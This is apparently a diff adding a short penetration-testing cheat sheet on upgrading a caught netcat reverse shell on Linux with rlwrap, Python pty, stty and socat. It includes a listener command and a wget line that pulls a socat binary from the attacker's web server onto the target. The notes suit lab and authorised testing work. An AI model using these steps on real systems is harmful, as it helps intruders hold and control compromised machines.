@@ -1,0 +1,44 @@
+Upgrading ncat shell - Linux
+
+################ RLWRAP TECHNIQUE ################
+rlwrap nc -lvnp PORT      Gives a much more fully featured shell 
+Ctrl+Z
+stty raw -echo; fg
+stty size                 Check variables on my own properly-working terminal prompt
+stty rows 67 columns 318  Apply those inputs to netcat shell
+
+################ SOCAT TECHNIQUE ################
+sudo python3 -m http.server 80   
+                          Using a webserver on the attacking machine inside the directory containing your socat binary 
+wget <LOCAL_IP>/socat -O /tmp/socat
+                          On the target machine, using the ncat shell to download the file
+
+################ NEW TECHNIQUE ################
+python -c 'import pty;pty.spawn("/bin/bash")'
+                          Spawn a better featured bash shell using Python (use specific version if required)
+export TERM=xterm         Give access to term commands
+Ctrl+Z
+stty raw -echo; fg        Background the shell
+stty size                 Check variables on my own properly-working terminal prompt
+stty rows 67 columns 318  Apply those inputs to netcat shell
+
+################ OLD/SIMILAR TECHNIQUE ################
+python -c 'import pty; pty.spawn("/bin/bash")'
+                          Upgrading TTY
+Ctrl+Z
+2x Ctrl+Return
+stty raw -echo; fg
+echo $TERM
+stty size                 Check variables on my own properly-working terminal prompt
+export TERM=xterm-256color
+stty rows 67 columns 318  Apply those inputs to netcat shell
+
+
+
+Informational:
+If the shell dies, any input in your own terminal will not be visible 
+(as a result of having disabled terminal echo). To fix this, type "reset" and press enter.
+
+
+
+                         rlwrap (especially usefull when dealing with Windows shells)
